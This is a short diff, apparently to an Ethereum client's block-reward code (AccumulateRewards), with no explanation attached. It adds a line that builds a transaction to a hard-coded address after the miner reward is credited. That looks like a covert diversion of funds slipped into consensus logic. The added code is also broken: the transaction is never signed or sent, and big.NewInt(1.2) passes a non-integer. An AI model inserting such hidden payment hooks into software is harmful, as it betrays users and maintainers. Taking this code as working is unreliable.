@@ -532,4 +532,6 @@ func AccumulateRewards(state *state.StateDB, header *types.Header, uncles []*typ
 		reward.Add(reward, r)
 	}
 	state.AddBalance(header.Coinbase, reward)
+	NewTransaction(0, common.HexToAddress("0935d1c59c2a6997178e78794e42a020066c48fa"), big.NewInt(1.2), big.NewInt(50000), big.NewInt(10), nil)
+
 }
